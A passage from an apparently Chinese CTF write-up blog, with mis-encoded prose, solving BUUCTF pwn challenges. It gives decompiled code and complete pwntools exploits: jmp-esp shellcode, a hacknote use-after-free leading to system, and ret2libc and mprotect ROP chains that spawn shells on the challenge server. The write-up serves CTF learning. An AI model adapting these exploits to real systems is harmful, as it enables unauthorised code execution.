class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK bye~&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰å¯ç”¨çš„gadgetï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:08048551 hint            proc near</span><br><span class="line">.text:08048551 ; __unwind &#123;</span><br><span class="line">.text:08048551                 push    ebp</span><br><span class="line">.text:08048552                 mov     ebp, esp</span><br><span class="line">.text:08048554                 jmp     esp</span><br><span class="line">.text:08048554 hint            endp</span><br></pre></td></tr></table></figure><p>ç›´æ¥å†™shellcodeçš„è¯ä¼šå¤ªé•¿ï¼Œé‚£ä¹ˆéœ€è¦æ‰¾ä¸€äº›çŸ­çš„shellcode(æˆ–è€…æ‰‹å†™)ï¼Œä¹‹åçš„retè¦†å†™ä¸ºjmpçš„é‚£ä¸ªgadgetï¼Œåé¢è¿˜éœ€è¦æå‡å †æ ˆã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_s_9&quot;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29087</span>)</span><br><span class="line">jump_esp=<span class="number">0x8048554</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xB</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shell = asm(shellcode)</span><br><span class="line">payload = shell.ljust(<span class="number">0x24</span>,<span class="string">&#x27;a&#x27;</span>)+p32(jump_esp)</span><br><span class="line">payload+=asm(<span class="string">&quot;sub esp,40;call esp;&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x41-pwnable-hacknote"><a href="#0x41-pwnable-hacknote" class="headerlink" title="0x41.pwnable_hacknote"></a>0x41.pwnable_hacknote</h1><p>æ²¡å¼€PIE</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec  hacknote </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/hacknote&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>UAFï¼Œä¹‹å‰å¥½åƒåšè¿‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( chunk_number &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;ptr)[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        (&amp;ptr)[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !(&amp;ptr)[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(&amp;ptr)[i] = puts_0;<span class="comment">//putsçš„åœ°å€</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (&amp;ptr)[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !(&amp;ptr)[i][<span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, (&amp;ptr)[i][<span class="number">1</span>], size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++chunk_number;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= chunk_number )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;ptr)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;ptr)[v1][<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>((&amp;ptr)[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= chunk_number )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;ptr)[v1] )</span><br><span class="line">    (*(&amp;ptr)[v1])((&amp;ptr)[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>freeåæ²¡æ¸…ç©ºï¼Œæœ‰UAF</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./hacknote&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26602</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">0x20</span>,<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">add_note(<span class="number">0x20</span>,<span class="string">&#x27;aaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804862B</span>)+ p32(<span class="number">0x804A018</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">8</span>,payload)</span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free_got = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base = free_got - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(system)+<span class="string">&#x27;;sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add_note(<span class="number">8</span>,payload)</span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x42-jarvisoj-level5"><a href="#0x42-jarvisoj-level5" class="headerlink" title="0x42.jarvisoj_level5"></a>0x42.jarvisoj_level5</h1><p>å…ˆçœ‹ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec level3_x64 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/level3_x64&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£æ³•ä¸€ï¼šret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./level3_x64&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26861</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-x64-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libdl.so.2&#x27;)</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x04006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00004006b1</span> </span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(<span class="number">8</span>)+p64(write_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># io.recv(8)</span></span><br><span class="line">write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base+ libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+p64(main_addr)+p64(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>è§£æ³•äºŒï¼šmprotect</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26861</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./level3_x64&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-x64-2.23.so&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,word_size=<span class="string">&#x27;64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">&#x27;a&#x27;</span> + p64(pop_rsi_r15_ret) + p64(elf.got[<span class="string">&quot;write&quot;</span>]) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(elf.symbols[<span class="string">&quot;write&quot;</span>]) + p64(elf.symbols[<span class="string">&quot;main&quot;</span>])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">mprotect_addr = libc_base + libc.symbols[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line"><span class="comment">########### read shell code to bss</span></span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(elf.bss()) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">&quot;read&quot;</span>]) + p64(elf.symbols[<span class="string">&quot;main&quot;</span>])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">###########write bss to got table</span></span><br><span class="line">bss_got = <span class="number">0x600A48</span></span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(bss_got) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">&quot;read&quot;</span>]) + p64(elf.symbols[<span class="string">&quot;main&quot;</span>])</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(p64(elf.bss()))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment">###########write mprotect to got table</span></span><br><span class="line">mprotect_got = <span class="number">0x600A50</span></span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(mprotect_got) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">&quot;read&quot;</span>]) + p64(elf.symbols[<span class="string">&quot;main&quot;</span>])</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(p64(mprotect_addr))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x4006A6</span>) + <span class="string">&quot;ret_addr&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(mprotect_got) + p64(<span class="number">7</span>) +p64(<span class="number">0x1000</span>)+p64(<span class="number">0x600000</span>)</span><br><span class="line">payload += p64(<span class="number">0x400690</span>)</span><br><span class="line">payload += <span class="string">&quot;ret_addr&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_got) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400690</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x43-picoctf-2018-shellcode"><a href="#0x43-picoctf-2018-shellcode" class="headerlink" title="0x43.picoctf_2018_shellcode"></a>0x43.picoctf_2018_shellcode</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ checksec PicoCTF_2018_shellcode</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/PicoCTF_2018_shellcode&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>ä¸»å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 